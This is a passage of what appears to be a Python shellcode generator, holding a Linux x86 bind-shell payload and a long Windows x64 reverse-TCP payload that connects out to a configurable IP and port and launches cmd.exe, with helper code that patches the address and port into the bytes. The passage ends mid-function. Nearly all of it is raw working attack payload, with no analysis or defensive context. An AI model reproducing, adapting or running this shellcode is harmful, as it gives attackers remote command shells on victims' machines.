        code += "\\x75\\x0B\\x48\\x8B\\x44\\x24\\x28\\x48\\x8B\\x40\\x30\\xEB\\x07\\xE9\\x24"
        code += "\\xFE\\xFF\\xFF\\x33\\xC0\\x48\\x83\\xC4\\x58\\xC3\\x48\\x89\\x54\\x24\\x10"
        code += "\\x48\\x89\\x4C\\x24\\x08\\x57\\x48\\x83\\xEC\\x10\\x48\\x8B\\x44\\x24\\x20"
        code += "\\x48\\x89\\x04\\x24\\x48\\x8B\\x3C\\x24\\x33\\xC0\\x48\\x8B\\x4C\\x24\\x28"
        code += "\\xF3\\xAA\\x48\\x8B\\x44\\x24\\x20\\x48\\x83\\xC4\\x10\\x5F\\xC3"

        port = hex(socket.htons(int(port)))
        # Reverse Engineer: Convert Hex to Decimal byte1 and byte2
        # In Windows Shellcode must be inversed byte2 and byte1
        # Inject the port number
        code = code.replace("\\xBB\\x01", "\\x{b2}\\x{b1}".format(b1 = port[4:6].upper(), b2 = port[2:4].upper()))

        #code = hex_format(bytes(code, encoding='ascii'))

        return code

    def linux_bind_tcp(port):
        """
        Replaces PORT
        """
        
        code =  ""
        code += "\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9"
        code += "\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11"
        code += "\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01"
        code += "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7"
        code += "\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb"
        code += "\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80"
        code += "\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb"
        code += "\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8"
        code += "\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2"
        code += "\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03"
        code += "\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x49\\xcd"
        code += "\\x80\\x41\\xe2\\xf4\\x31\\xc0\\x50\\x68"
        code += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
        code += "\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"

        port = hex(socket.htons(int(port)))
        code = code.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))

        #code = hex_format(bytes(code, encoding='ascii'))

        return code

class generate_reverse_shell:
    """
    Generate reverse shell shellcode
    """

    def windows_reverse_tcp(ip, port):
        """
        Replaces IP and PORT
        """

        code =  ""
        code += "\\x56\\x48\\x8B\\xF4\\x48\\x83\\xE4\\xF0\\x48\\x83\\xEC\\x20\\xE8\\x05\\x00"
        code += "\\x00\\x00\\x48\\x8B\\xE6\\x5E\\xC3\\x48\\x81\\xEC\\x58\\x03\\x00\\x00\\x48"
        code += "\\x8D\\x8C\\x24\\x90\\x00\\x00\\x00\\xE8\\xBC\\x04\\x00\\x00\\x0F\\xB6\\xC0"
        code += "\\x85\\xC0\\x75\\x0A\\xB8\\x01\\x00\\x00\\x00\\xE9\\x69\\x02\\x00\\x00\\x48"
        code += "\\x8D\\x94\\x24\\x40\\x01\\x00\\x00\\x48\\x8D\\x8C\\x24\\x90\\x00\\x00\\x00"
        code += "\\xE8\\x5C\\x02\\x00\\x00\\x0F\\xB6\\xC0\\x85\\xC0\\x75\\x07\\x33\\xC0\\xE9"
        code += "\\x46\\x02\\x00\\x00\\xE8\\x10\\x00\\x00\\x00\\x75\\x73\\x65\\x72\\x33\\x32"
        code += "\\x2E\\x64\\x6C\\x6C\\x00\\x00\\x00\\x00\\x00\\x00\\x59\\xFF\\x94\\x24\\x90"
        code += "\\x00\\x00\\x00\\x48\\x89\\x84\\x24\\xC0\\x00\\x00\\x00\\xE8\\x10\\x00\\x00"
        code += "\\x00\\x31\\x32\\x37\\x2E\\x30\\x2E\\x30\\x2E\\x31\\x00\\x00\\x00\\x00\\x00"
        code += "\\x00\\x00\\x58\\x48\\x89\\x44\\x24\\x70\\xB8\\xBB\\x01\\x00\\x00\\x66\\x89"
        code += "\\x44\\x24\\x50\\xBA\\x98\\x01\\x00\\x00\\x48\\x8D\\x8C\\x24\\xB0\\x01\\x00"
        code += "\\x00\\xE8\\x60\\x0A\\x00\\x00\\x48\\x8D\\x94\\x24\\xB0\\x01\\x00\\x00\\x66"
        code += "\\xB9\\x02\\x02\\xFF\\x94\\x24\\x40\\x01\\x00\\x00\\xBA\\x10\\x00\\x00\\x00"
        code += "\\x48\\x8D\\x4C\\x24\\x60\\xE8\\x3E\\x0A\\x00\\x00\\xC7\\x44\\x24\\x28\\x00"
        code += "\\x00\\x00\\x00\\xC7\\x44\\x24\\x20\\x00\\x00\\x00\\x00\\x45\\x33\\xC9\\x41"
        code += "\\xB8\\x06\\x00\\x00\\x00\\xBA\\x01\\x00\\x00\\x00\\xB9\\x02\\x00\\x00\\x00"
        code += "\\xFF\\x94\\x24\\xA0\\x01\\x00\\x00\\x48\\x89\\x44\\x24\\x58\\x48\\x8B\\x4C"
        code += "\\x24\\x70\\xFF\\x94\\x24\\x50\\x01\\x00\\x00\\x89\\x44\\x24\\x64\\xB8\\x02"
        code += "\\x00\\x00\\x00\\x66\\x89\\x44\\x24\\x60\\x0F\\xB7\\x4C\\x24\\x50\\xFF\\x94"
        code += "\\x24\\x88\\x01\\x00\\x00\\x66\\x89\\x44\\x24\\x62\\x48\\xC7\\x44\\x24\\x30"
        code += "\\x00\\x00\\x00\\x00\\x48\\xC7\\x44\\x24\\x28\\x00\\x00\\x00\\x00\\x48\\xC7"
        code += "\\x44\\x24\\x20\\x00\\x00\\x00\\x00\\x45\\x33\\xC9\\x41\\xB8\\x10\\x00\\x00"
        code += "\\x00\\x48\\x8D\\x54\\x24\\x60\\x48\\x8B\\x4C\\x24\\x58\\xFF\\x94\\x24\\x98"
        code += "\\x01\\x00\\x00\\xBA\\x68\\x00\\x00\\x00\\x48\\x8D\\x8C\\x24\\xD0\\x00\\x00"
        code += "\\x00\\xE8\\x9D\\x09\\x00\\x00\\xC7\\x84\\x24\\xD0\\x00\\x00\\x00\\x68\\x00"
        code += "\\x00\\x00\\xBA\\x18\\x00\\x00\\x00\\x48\\x8D\\x4C\\x24\\x78\\xE8\\x83\\x09"
        code += "\\x00\\x00\\xC7\\x84\\x24\\x0C\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x48\\x8B"
        code += "\\x44\\x24\\x58\\x48\\x89\\x84\\x24\\x30\\x01\\x00\\x00\\x48\\x8B\\x84\\x24"
        code += "\\x30\\x01\\x00\\x00\\x48\\x89\\x84\\x24\\x28\\x01\\x00\\x00\\x48\\x8B\\x84"
        code += "\\x24\\x28\\x01\\x00\\x00\\x48\\x89\\x84\\x24\\x20\\x01\\x00\\x00\\x48\\x8D"
        code += "\\x44\\x24\\x78\\x48\\x89\\x44\\x24\\x48\\x48\\x8D\\x84\\x24\\xD0\\x00\\x00"
        code += "\\x00\\x48\\x89\\x44\\x24\\x40\\x48\\xC7\\x44\\x24\\x38\\x00\\x00\\x00\\x00"
        code += "\\x48\\xC7\\x44\\x24\\x30\\x00\\x00\\x00\\x00\\xC7\\x44\\x24\\x28\\x00\\x00"
        code += "\\x00\\x00\\xC7\\x44\\x24\\x20\\x01\\x00\\x00\\x00\\x45\\x33\\xC9\\x45\\x33"
        code += "\\xC0\\xE8\\x18\\x00\\x00\\x00\\x2F\\x00\\x63\\x00\\x20\\x00\\x63\\x00\\x6D"
        code += "\\x00\\x64\\x00\\x2E\\x00\\x65\\x00\\x78\\x00\\x65\\x00\\x00\\x00\\x00\\x00"
        code += "\\x5A\\xE8\\x38\\x00\\x00\\x00\\x43\\x00\\x3A\\x00\\x5C\\x00\\x57\\x00\\x69"
        code += "\\x00\\x6E\\x00\\x64\\x00\\x6F\\x00\\x77\\x00\\x73\\x00\\x5C\\x00\\x53\\x00"
        code += "\\x79\\x00\\x73\\x00\\x74\\x00\\x65\\x00\\x6D\\x00\\x33\\x00\\x32\\x00\\x5C"
        code += "\\x00\\x63\\x00\\x6D\\x00\\x64\\x00\\x2E\\x00\\x65\\x00\\x78\\x00\\x65\\x00"
        code += "\\x00\\x00\\x59\\xFF\\x94\\x24\\xA0\\x00\\x00\\x00\\xB8\\x01\\x00\\x00\\x00"
        code += "\\xEB\\x2C\\xBA\\xFF\\xFF\\xFF\\xFF\\x48\\x8B\\x4C\\x24\\x78\\xFF\\x94\\x24"
        code += "\\xB0\\x00\\x00\\x00\\x48\\x8B\\x4C\\x24\\x78\\xFF\\x94\\x24\\xB8\\x00\\x00"
        code += "\\x00\\x48\\x8B\\x8C\\x24\\x80\\x00\\x00\\x00\\xFF\\x94\\x24\\xB8\\x00\\x00"
        code += "\\x00\\x48\\x81\\xC4\\x58\\x03\\x00\\x00\\xC3\\x48\\x89\\x54\\x24\\x10\\x48"
        code += "\\x89\\x4C\\x24\\x08\\x48\\x83\\xEC\\x38\\xE8\\x10\\x00\\x00\\x00\\x57\\x53"
        code += "\\x32\\x5F\\x33\\x32\\x2E\\x64\\x6C\\x6C\\x00\\x00\\x00\\x00\\x00\\x00\\x59"
        code += "\\x48\\x8B\\x44\\x24\\x40\\xFF\\x10\\x48\\x89\\x44\\x24\\x20\\xE8\\x0C\\x00"
        code += "\\x00\\x00\\x57\\x53\\x41\\x53\\x74\\x61\\x72\\x74\\x75\\x70\\x00\\x00\\x5A"
        code += "\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B"
        code += "\\x4C\\x24\\x48\\x48\\x89\\x01\\xE8\\x0C\\x00\\x00\\x00\\x73\\x6F\\x63\\x6B"
        code += "\\x65\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48"
        code += "\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41"
        code += "\\x08\\xE8\\x0C\\x00\\x00\\x00\\x69\\x6E\\x65\\x74\\x5F\\x61\\x64\\x64\\x72"
        code += "\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF"
        code += "\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x10\\xE8\\x08\\x00\\x00"
        code += "\\x00\\x62\\x69\\x6E\\x64\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20"
        code += "\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89"
        code += "\\x41\\x18\\xE8\\x08\\x00\\x00\\x00\\x6C\\x69\\x73\\x74\\x65\\x6E\\x00\\x00"
        code += "\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48"
        code += "\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x20\\xE8\\x08\\x00\\x00\\x00\\x61\\x63"
        code += "\\x63\\x65\\x70\\x74\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44"
        code += "\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x28\\xE8"
        code += "\\x08\\x00\\x00\\x00\\x72\\x65\\x63\\x76\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B"
        code += "\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24"
        code += "\\x48\\x48\\x89\\x41\\x30\\xE8\\x0C\\x00\\x00\\x00\\x73\\x65\\x6E\\x64\\x00"
        code += "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B"
        code += "\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x38"
        code += "\\xE8\\x0C\\x00\\x00\\x00\\x63\\x6C\\x6F\\x73\\x65\\x73\\x6F\\x63\\x6B\\x65"
        code += "\\x74\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50"
        code += "\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x40\\xE8\\x0C\\x00\\x00\\x00"
        code += "\\x68\\x74\\x6F\\x6E\\x73\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B"
        code += "\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24"
        code += "\\x48\\x48\\x89\\x41\\x48\\xE8\\x10\\x00\\x00\\x00\\x57\\x53\\x41\\x43\\x6C"
        code += "\\x65\\x61\\x6E\\x75\\x70\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C"
        code += "\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48"
        code += "\\x48\\x89\\x41\\x50\\xE8\\x10\\x00\\x00\\x00\\x57\\x53\\x41\\x43\\x6F\\x6E"
        code += "\\x6E\\x65\\x63\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24"
        code += "\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48"
        code += "\\x89\\x41\\x58\\xE8\\x10\\x00\\x00\\x00\\x57\\x53\\x41\\x53\\x6F\\x63\\x6B"
        code += "\\x65\\x74\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20"
        code += "\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89"
        code += "\\x41\\x60\\xB0\\x01\\x48\\x83\\xC4\\x38\\xC3\\x48\\x89\\x4C\\x24\\x08\\x48"
        code += "\\x83\\xEC\\x68\\xE8\\x20\\x00\\x00\\x00\\x6B\\x00\\x65\\x00\\x72\\x00\\x6E"
        code += "\\x00\\x65\\x00\\x6C\\x00\\x33\\x00\\x32\\x00\\x2E\\x00\\x64\\x00\\x6C\\x00"
        code += "\\x6C\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x59\\xE8\\xDB\\x03\\x00"
        code += "\\x00\\x48\\x89\\x44\\x24\\x20\\x48\\x83\\x7C\\x24\\x20\\x00\\x75\\x07\\x32"
        code += "\\xC0\\xE9\\x92\\x01\\x00\\x00\\xE8\\x10\\x00\\x00\\x00\\x4C\\x6F\\x61\\x64"
        code += "\\x4C\\x69\\x62\\x72\\x61\\x72\\x79\\x41\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B"
        code += "\\x4C\\x24\\x20\\xE8\\x77\\x01\\x00\\x00\\x48\\x89\\x44\\x24\\x30\\x48\\x83"
        code += "\\x7C\\x24\\x30\\x00\\x75\\x07\\x32\\xC0\\xE9\\x5E\\x01\\x00\\x00\\xE8\\x10"
        code += "\\x00\\x00\\x00\\x47\\x65\\x74\\x50\\x72\\x6F\\x63\\x41\\x64\\x64\\x72\\x65"
        code += "\\x73\\x73\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\xE8\\x43\\x01\\x00\\x00"
        code += "\\x48\\x89\\x44\\x24\\x38\\x48\\x83\\x7C\\x24\\x38\\x00\\x75\\x07\\x32\\xC0"
        code += "\\xE9\\x2A\\x01\\x00\\x00\\xE8\\x10\\x00\\x00\\x00\\x43\\x72\\x65\\x61\\x74"
        code += "\\x65\\x50\\x72\\x6F\\x63\\x65\\x73\\x73\\x57\\x00\\x00\\x5A\\x48\\x8B\\x4C"
        code += "\\x24\\x20\\xE8\\x0F\\x01\\x00\\x00\\x48\\x89\\x44\\x24\\x28\\x48\\x83\\x7C"
        code += "\\x24\\x28\\x00\\x75\\x07\\x32\\xC0\\xE9\\xF6\\x00\\x00\\x00\\xE8\\x10\\x00"
        code += "\\x00\\x00\\x45\\x78\\x69\\x74\\x50\\x72\\x6F\\x63\\x65\\x73\\x73\\x00\\x00"
        code += "\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\xE8\\xDB\\x00\\x00\\x00\\x48"
        code += "\\x89\\x44\\x24\\x50\\x48\\x83\\x7C\\x24\\x50\\x00\\x75\\x07\\x32\\xC0\\xE9"
        code += "\\xC2\\x00\\x00\\x00\\xE8\\x18\\x00\\x00\\x00\\x57\\x61\\x69\\x74\\x46\\x6F"
        code += "\\x72\\x53\\x69\\x6E\\x67\\x6C\\x65\\x4F\\x62\\x6A\\x65\\x63\\x74\\x00\\x00"
        code += "\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\xE8\\x9F\\x00\\x00\\x00\\x48"
        code += "\\x89\\x44\\x24\\x40\\x48\\x83\\x7C\\x24\\x40\\x00\\x75\\x07\\x32\\xC0\\xE9"
        code += "\\x86\\x00\\x00\\x00\\xE8\\x10\\x00\\x00\\x00\\x43\\x6C\\x6F\\x73\\x65\\x48"
        code += "\\x61\\x6E\\x64\\x6C\\x65\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24"
        code += "\\x20\\xE8\\x6B\\x00\\x00\\x00\\x48\\x89\\x44\\x24\\x48\\x48\\x83\\x7C\\x24"
        code += "\\x48\\x00\\x75\\x04\\x32\\xC0\\xEB\\x55\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B"
        code += "\\x4C\\x24\\x30\\x48\\x89\\x08\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B\\x4C\\x24"
        code += "\\x38\\x48\\x89\\x48\\x08\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B\\x4C\\x24\\x28"
        code += "\\x48\\x89\\x48\\x10\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B\\x4C\\x24\\x28\\x48"
        code += "\\x89\\x48\\x18\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B\\x4C\\x24\\x40\\x48\\x89"
        code += "\\x48\\x20\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x48"
        code += "\\x28\\xB0\\x01\\x48\\x83\\xC4\\x68\\xC3\\x48\\x89\\x54\\x24\\x10\\x48\\x89"
        code += "\\x4C\\x24\\x08\\x48\\x83\\xEC\\x78\\x48\\x8B\\x84\\x24\\x80\\x00\\x00\\x00"
        code += "\\x48\\x89\\x44\\x24\\x30\\x48\\x8B\\x44\\x24\\x30\\x0F\\xB7\\x00\\x3D\\x4D"
        code += "\\x5A\\x00\\x00\\x74\\x07\\x33\\xC0\\xE9\\xFA\\x01\\x00\\x00\\x48\\x8B\\x44"
        code += "\\x24\\x30\\x48\\x63\\x40\\x3C\\x48\\x8B\\x8C\\x24\\x80\\x00\\x00\\x00\\x48"
        code += "\\x03\\xC8\\x48\\x8B\\xC1\\x48\\x89\\x44\\x24\\x40\\xB8\\x08\\x00\\x00\\x00"
        code += "\\x48\\x6B\\xC0\\x00\\x48\\x8B\\x4C\\x24\\x40\\x48\\x8D\\x84\\x01\\x88\\x00"
        code += "\\x00\\x00\\x48\\x89\\x44\\x24\\x38\\x48\\x8B\\x44\\x24\\x38\\x83\\x38\\x00"
        code += "\\x75\\x07\\x33\\xC0\\xE9\\xB2\\x01\\x00\\x00\\x48\\x8B\\x44\\x24\\x38\\x8B"
        code += "\\x00\\x89\\x44\\x24\\x18\\x8B\\x44\\x24\\x18\\x48\\x03\\x84\\x24\\x80\\x00"
        code += "\\x00\\x00\\x48\\x89\\x44\\x24\\x10\\x48\\x8B\\x44\\x24\\x10\\x8B\\x40\\x18"
        code += "\\x48\\x89\\x44\\x24\\x48\\x48\\x8B\\x44\\x24\\x10\\x8B\\x40\\x1C\\x89\\x44"
        code += "\\x24\\x24\\x48\\x8B\\x44\\x24\\x10\\x8B\\x40\\x20\\x89\\x44\\x24\\x1C\\x48"
        code += "\\x8B\\x44\\x24\\x10\\x8B\\x40\\x24\\x89\\x44\\x24\\x20\\x48\\xC7\\x44\\x24"
        code += "\\x08\\x00\\x00\\x00\\x00\\xEB\\x0D\\x48\\x8B\\x44\\x24\\x08\\x48\\xFF\\xC0"
        code += "\\x48\\x89\\x44\\x24\\x08\\x48\\x8B\\x44\\x24\\x48\\x48\\x39\\x44\\x24\\x08"
        code += "\\x0F\\x83\\x3B\\x01\\x00\\x00\\x8B\\x44\\x24\\x1C\\x48\\x8B\\x8C\\x24\\x80"
        code += "\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x48\\x8B\\x4C\\x24\\x08\\x48"
        code += "\\x8D\\x04\\x88\\x48\\x89\\x44\\x24\\x58\\x8B\\x44\\x24\\x20\\x48\\x8B\\x8C"
        code += "\\x24\\x80\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x48\\x8B\\x4C\\x24"
        code += "\\x08\\x48\\x8D\\x04\\x48\\x48\\x89\\x44\\x24\\x50\\x8B\\x44\\x24\\x24\\x48"
        code += "\\x8B\\x8C\\x24\\x80\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x48\\x8B"
        code += "\\x4C\\x24\\x50\\x0F\\xB7\\x09\\x48\\x8D\\x04\\x88\\x48\\x89\\x44\\x24\\x60"
        code += "\\x48\\x8B\\x44\\x24\\x58\\x8B\\x00\\x48\\x8B\\x8C\\x24\\x80\\x00\\x00\\x00"
        code += "\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x48\\x89\\x44\\x24\\x28\\x48\\xC7\\x04\\x24"
        code += "\\x00\\x00\\x00\\x00\\xEB\\x0B\\x48\\x8B\\x04\\x24\\x48\\xFF\\xC0\\x48\\x89"
        code += "\\x04\\x24\\x48\\x8B\\x04\\x24\\x48\\x8B\\x8C\\x24\\x88\\x00\\x00\\x00\\x48"
        code += "\\x03\\xC8\\x48\\x8B\\xC1\\x0F\\xBE\\x00\\x85\\xC0\\x74\\x45\\x48\\x8B\\x04"
        code += "\\x24\\x48\\x8B\\x4C\\x24\\x28\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x0F\\xBE\\x00"
        code += "\\x85\\xC0\\x74\\x2F\\x48\\x8B\\x04\\x24\\x48\\x8B\\x8C\\x24\\x88\\x00\\x00"
        code += "\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x0F\\xBE\\x00\\x48\\x8B\\x0C\\x24\\x48"
        code += "\\x8B\\x54\\x24\\x28\\x48\\x03\\xD1\\x48\\x8B\\xCA\\x0F\\xBE\\x09\\x3B\\xC1"
        code += "\\x74\\x02\\xEB\\x02\\xEB\\x97\\x48\\x8B\\x04\\x24\\x48\\x8B\\x8C\\x24\\x88"
        code += "\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x0F\\xBE\\x00\\x85\\xC0\\x75"
        code += "\\x2D\\x48\\x8B\\x04\\x24\\x48\\x8B\\x4C\\x24\\x28\\x48\\x03\\xC8\\x48\\x8B"
        code += "\\xC1\\x0F\\xBE\\x00\\x85\\xC0\\x75\\x17\\x48\\x8B\\x44\\x24\\x60\\x8B\\x00"
        code += "\\x48\\x8B\\x8C\\x24\\x80\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\xEB"
        code += "\\x07\\xE9\\xA8\\xFE\\xFF\\xFF\\x33\\xC0\\x48\\x83\\xC4\\x78\\xC3\\x48\\x89"
        code += "\\x4C\\x24\\x08\\x48\\x83\\xEC\\x58\\x65\\x48\\x8B\\x04\\x25\\x60\\x00\\x00"
        code += "\\x00\\x48\\x89\\x44\\x24\\x40\\x48\\x8B\\x44\\x24\\x40\\x48\\x8B\\x40\\x18"
        code += "\\x48\\x89\\x44\\x24\\x48\\x48\\x8B\\x44\\x24\\x48\\x48\\x83\\xC0\\x20\\x48"
        code += "\\x89\\x44\\x24\\x38\\x48\\x8B\\x44\\x24\\x38\\x48\\x8B\\x00\\x48\\x89\\x44"
        code += "\\x24\\x30\\xEB\\x0D\\x48\\x8B\\x44\\x24\\x30\\x48\\x8B\\x00\\x48\\x89\\x44"
        code += "\\x24\\x30\\x48\\x8B\\x44\\x24\\x38\\x48\\x39\\x44\\x24\\x30\\x0F\\x84\\xBF"
        code += "\\x01\\x00\\x00\\x48\\x8B\\x44\\x24\\x30\\x48\\x83\\xE8\\x10\\x48\\x89\\x44"
        code += "\\x24\\x28\\x48\\x83\\x7C\\x24\\x28\\x00\\x74\\x0C\\x48\\x8B\\x44\\x24\\x28"
        code += "\\x48\\x83\\x78\\x30\\x00\\x75\\x05\\xE9\\x98\\x01\\x00\\x00\\x48\\x8B\\x44"
        code += "\\x24\\x28\\x48\\x8B\\x40\\x60\\x48\\x89\\x44\\x24\\x10\\x48\\x83\\x7C\\x24"
        code += "\\x10\\x00\\x75\\x02\\xEB\\xA4\\x48\\xC7\\x04\\x24\\x00\\x00\\x00\\x00\\xEB"
        code += "\\x0B\\x48\\x8B\\x04\\x24\\x48\\xFF\\xC0\\x48\\x89\\x04\\x24\\x48\\x8B\\x44"
        code += "\\x24\\x28\\x0F\\xB7\\x40\\x58\\x48\\x39\\x04\\x24\\x0F\\x83\\x26\\x01\\x00"
        code += "\\x00\\x48\\x8B\\x44\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x85"
        code += "\\xC0\\x74\\x11\\x48\\x8B\\x44\\x24\\x10\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04"
        code += "\\x48\\x85\\xC0\\x75\\x05\\xE9\\xFF\\x00\\x00\\x00\\x48\\x8B\\x44\\x24\\x60"
        code += "\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83\\xF8\\x5A\\x7F\\x47\\x48\\x8B"
        code += "\\x44\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83\\xF8\\x41\\x7C"
        code += "\\x35\\x48\\x8B\\x44\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83"
        code += "\\xE8\\x41\\x83\\xC0\\x61\\x89\\x44\\x24\\x20\\x48\\x8B\\x44\\x24\\x60\\x48"
        code += "\\x8B\\x0C\\x24\\x0F\\xB7\\x54\\x24\\x20\\x66\\x89\\x14\\x48\\x0F\\xB7\\x44"
        code += "\\x24\\x20\\x66\\x89\\x44\\x24\\x08\\xEB\\x12\\x48\\x8B\\x44\\x24\\x60\\x48"
        code += "\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x66\\x89\\x44\\x24\\x08\\x0F\\xB7\\x44"
        code += "\\x24\\x08\\x66\\x89\\x44\\x24\\x18\\x48\\x8B\\x44\\x24\\x10\\x48\\x8B\\x0C"
        code += "\\x24\\x0F\\xB7\\x04\\x48\\x83\\xF8\\x5A\\x7F\\x47\\x48\\x8B\\x44\\x24\\x10"
        code += "\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83\\xF8\\x41\\x7C\\x35\\x48\\x8B"
        code += "\\x44\\x24\\x10\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83\\xE8\\x41\\x83"
        code += "\\xC0\\x61\\x89\\x44\\x24\\x24\\x48\\x8B\\x44\\x24\\x10\\x48\\x8B\\x0C\\x24"
        code += "\\x0F\\xB7\\x54\\x24\\x24\\x66\\x89\\x14\\x48\\x0F\\xB7\\x44\\x24\\x24\\x66"
        code += "\\x89\\x44\\x24\\x0A\\xEB\\x12\\x48\\x8B\\x44\\x24\\x10\\x48\\x8B\\x0C\\x24"
        code += "\\x0F\\xB7\\x04\\x48\\x66\\x89\\x44\\x24\\x0A\\x0F\\xB7\\x44\\x24\\x0A\\x66"
        code += "\\x89\\x44\\x24\\x1C\\x0F\\xB7\\x44\\x24\\x18\\x0F\\xB7\\x4C\\x24\\x1C\\x3B"
        code += "\\xC1\\x74\\x02\\xEB\\x05\\xE9\\xBC\\xFE\\xFF\\xFF\\x48\\x8B\\x44\\x24\\x60"
        code += "\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x85\\xC0\\x75\\x1C\\x48\\x8B\\x44"
        code += "\\x24\\x10\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x85\\xC0\\x75\\x0B\\x48"
        code += "\\x8B\\x44\\x24\\x28\\x48\\x8B\\x40\\x30\\xEB\\x07\\xE9\\x24\\xFE\\xFF\\xFF"
        code += "\\x33\\xC0\\x48\\x83\\xC4\\x58\\xC3\\x48\\x89\\x54\\x24\\x10\\x48\\x89\\x4C"
        code += "\\x24\\x08\\x57\\x48\\x83\\xEC\\x10\\x48\\x8B\\x44\\x24\\x20\\x48\\x89\\x04"
        code += "\\x24\\x48\\x8B\\x3C\\x24\\x33\\xC0\\x48\\x8B\\x4C\\x24\\x28\\xF3\\xAA\\x48"
        code += "\\x8B\\x44\\x24\\x20\\x48\\x83\\xC4\\x10\\x5F\\xC3"

        #ip = binascii.hexlify(socket.inet_aton(ip))

        def split(si):
            return [char for char in si]
        
        ip_list = split(ip)
        #print(ip_list)
        hex_ip_list = list(map(hex, map(ord, ip_list)))
        #print(hex_ip_list)
        #print(hex_ip_list)
        #ip_bytes = ''
        #for byte in hex_ip_list:
        #    ip_bytes += '' + byte
        #ip_hex = ip_bytes.replace("0x", "\\x")
